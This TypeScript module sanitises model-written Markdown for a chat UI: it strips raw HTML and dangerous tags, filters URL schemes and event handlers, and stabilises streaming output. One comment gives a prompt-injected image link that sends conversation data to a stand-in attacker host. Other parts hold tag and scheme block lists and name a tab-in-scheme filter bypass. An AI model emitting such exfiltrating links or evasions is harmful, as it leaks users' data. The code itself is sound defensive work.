// Safe rendering rules for model-written Markdown (audit F12).
// Answers are built from untrusted text (web pages, abstracts, model output), so raw HTML is never rendered.
// Keep this module framework-free and erasable-TypeScript-only so `node --test` can import it.

type MdastNode = {
  type: string;
  value?: string;
  children?: MdastNode[];
};

type HastNode = {
  type: string;
  tagName?: string;
  value?: string;
  properties?: Record<string, unknown>;
  children?: HastNode[];
};

const BR_HTML = /^<br\s*\/?>$/i;

/**
 * Models write `<br>` inside table cells for line breaks. Turn exactly that tag into a Markdown hard break and
 * drop every other inline/block HTML node, so nothing reaches the renderer as raw HTML.
 */
export function remarkHtmlBreaks() {
  const visit = (node: MdastNode) => {
    if (!node.children) return;
    const next: MdastNode[] = [];
    for (const child of node.children) {
      if (child.type === "html") {
        if (BR_HTML.test((child.value || "").trim())) next.push({ type: "break" });
        continue;
      }
      visit(child);
      next.push(child);
    }
    node.children = next;
  };
  return (tree: MdastNode) => visit(tree);
}

const BLOCKED_TAGS = new Set([
  "script", "style", "iframe", "frame", "frameset", "object", "embed", "applet", "form", "button",
  "textarea", "select", "option", "link", "meta", "base", "svg", "math", "template", "portal", "video", "audio",
]);

const URL_PROPERTIES = new Set(["href", "src", "action", "formAction", "xLinkHref", "poster", "background", "cite"]);

/** http(s), mailto, in-page anchors and relative paths only; anything else (javascript:, data:, vbscript:) is dropped. */
export function safeUrl(value: unknown): string {
  const url = String(value ?? "").trim();
  if (!url) return "";
  // Control characters and whitespace inside a scheme are a classic filter bypass ("java\tscript:").
  const compact = url.replace(/[\u0000- \u007f]+/g, "");
  const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(compact);
  if (!scheme) return url;
  return /^(https?|mailto)$/i.test(scheme[1]) ? url : "";
}

/**
 * Splits streaming Markdown at blank lines outside code fences. Every block but the last is complete, so the
 * renderer memoizes them; the final answer is rendered whole (with citations) once the stream ends.
 */
export function splitStreamingBlocks(text: string): string[] {
  const blocks: string[] = [];
  let current: string[] = [];
  let inFence = false;
  for (const line of text.split("\n")) {
    if (/^\s*(```|~~~)/.test(line)) inFence = !inFence;
    if (!inFence && line.trim() === "" && current.length) {
      blocks.push(current.join("\n"));
      current = [];
      continue;
    }
    current.push(line);
  }
  if (current.length) blocks.push(current.join("\n"));
  return blocks;
}

const TABLE_DELIMITER_ROW = /^\s*\|?\s*:?-+:?\s*(\|\s*:?-+:?\s*)*\|?\s*$/;
const tableCells = (row: string) => row.trim().replace(/^\|/, "").replace(/\|$/, "").split("|").length;
const LONE_BLOCK_MARKER = /^\s{0,3}(#{1,6}|[-*+]|\d{1,9}[.)]|>|[-=]+|`{1,2}|~{1,2})\s*$/;

/**
 * Makes the still-growing last block of a streaming answer render the way it will once complete, so the
 * layout doesn't jump: a table appears only once its header and delimiter rows are in, a half-typed row is
 * held back, a lone list/heading marker (or a "-" that would turn the line above into a setext heading) waits
 * for its text, and an unclosed `**` or inline code span is closed provisionally. Text inside an open code
 * fence is left alone (an unclosed fence already renders as a code block to the end).
 */
export function stabilizeStreamingTail(block: string): string {
  if (!block) return block;
  const lines = block.split("\n");
  let inFence = false;
  for (const line of lines) if (/^\s*(```|~~~)/.test(line)) inFence = !inFence;
  if (inFence) return block;

  // A trailing marker with no text yet.
  if (lines.length && LONE_BLOCK_MARKER.test(lines[lines.length - 1]) && !/^\s*(```|~~~)/.test(lines[lines.length - 1])) {
    lines.pop();
  }

  // A trailing table: the run of lines starting with "|".
  let start = lines.length;
  while (start > 0 && /^\s*\|/.test(lines[start - 1])) start--;
  if (start < lines.length) {
    const rows = lines.slice(start);
    // Rows close with a pipe when the header does; then a row without one is still being typed.
    const closed = /\|\s*$/.test(rows[0]);
    const delimiterDone =
      rows.length >= 2 &&
      TABLE_DELIMITER_ROW.test(rows[1]) &&
      (rows.length > 2 || ((!closed || /\|\s*$/.test(rows[1])) && tableCells(rows[1]) === tableCells(rows[0])));
    if (!delimiterDone) {
      // Header without a finished delimiter row: it would render as a paragraph of pipes, then jump into a table.
      lines.length = start;
    } else if (rows.length > 2 && closed && !/\|\s*$/.test(rows[rows.length - 1])) {
      lines.pop();
    }
  }

  let out = lines.join("\n").replace(/\s+$/, "");
  if (!out) return "";

  // Provisionally close emphasis/code opened on the last line, so "**Key" renders bold, not as "**Key".
  const paragraph = out.slice(out.lastIndexOf("\n") + 1);
  if (!/^\s*\|/.test(paragraph)) {
    const ticks = (paragraph.match(/`/g) || []).length;
    if (ticks % 2 === 1) {
      out += "`";
    } else if (!paragraph.includes("***")) {
      const strong = paragraph.match(/\*\*/g) || [];
      if (strong.length % 2 === 1) {
        if (/\*\*$/.test(out)) out = out.slice(0, -2).replace(/\s+$/, "");
        else out += "**";
      }
    }
  }
  return out;
}

/** react-markdown `urlTransform`: same rule as safeUrl. */
export function safeUrlTransform(url: string): string {
  return safeUrl(url);
}

/** Host of an http(s) URL, or "" for relative/other URLs. */
function urlHost(url: string): string {
  const m = /^https?:\/\/([^/?#:]+)/i.exec(url.trim());
  return m ? m[1].toLowerCase() : "";
}

function imageAlt(props: Record<string, unknown>): string {
  const alt = typeof props.alt === "string" ? props.alt.trim() : "";
  return alt || "untitled";
}

/**
 * Model-written images are never loaded automatically (UI-002): an `<img>` would fetch its URL on render, so a
 * prompt-injected `![](https://attacker/?q=<conversation data>)` leaks data and the reader's IP with no click.
 * The image becomes a plain link the reader can choose to open (or a text placeholder when its URL is unsafe).
 */
function imagePlaceholder(props: Record<string, unknown>): HastNode {
  const src = safeUrl(props.src);
  const host = urlHost(src);
  const label = `Image: ${imageAlt(props)}${host ? ` (${host})` : ""}`;
  if (src && host) {
    return {
      type: "element",
      tagName: "a",
      properties: { href: src, className: ["md-image-link"], title: "Images in answers are not loaded automatically; open to view" },
      children: [{ type: "text", value: label }],
    };
  }
  return {
    type: "element",
    tagName: "span",
    properties: { className: ["md-image-link"] },
    children: [{ type: "text", value: `[${label}]` }],
  };
}

/**
 * Defence in depth after remark-rehype: removes raw nodes, active elements, event handlers, srcdoc/style
 * attributes and unsafe URLs, whatever produced them, and turns images into click-to-open links (UI-002).
 * Trusted plugins (citations, tables) run after this one.
 */
export function rehypeStripUnsafe() {
  const clean = (node: HastNode) => {
    if (!node.children) return;
    const next: HastNode[] = [];
    for (const child of node.children) {
      if (child.type === "raw" || child.type === "comment" || child.type === "doctype") continue;
      if (child.type === "element") {
        const tag = String(child.tagName).toLowerCase();
        if (BLOCKED_TAGS.has(tag)) continue;
        if (tag === "img" || tag === "image" || tag === "picture" || tag === "source") {
          if (tag === "img" || tag === "image") next.push(imagePlaceholder(child.properties || {}));
          continue;
        }
        const props = child.properties || {};
        // GFM task lists render disabled checkboxes; no other input survives.
        if (tag === "input" && (props.type !== "checkbox" || !props.disabled)) continue;
        for (const key of Object.keys(props)) {
          const lower = key.toLowerCase();
          if (lower.startsWith("on") || lower === "srcdoc" || lower === "style" || lower === "formaction") {
            delete props[key];
          } else if (URL_PROPERTIES.has(key)) {
            const safe = safeUrl(props[key]);
            if (safe) props[key] = safe;
            else delete props[key];
          } else if (lower.startsWith("datacite")) {
            // Citation anchors are created by the trusted citation plugin, never taken from the input.
            delete props[key];
          }
        }
        child.properties = props;
      }
      clean(child);
      next.push(child);
    }
    node.children = next;
  };
  return (tree: HastNode) => clean(tree);
}
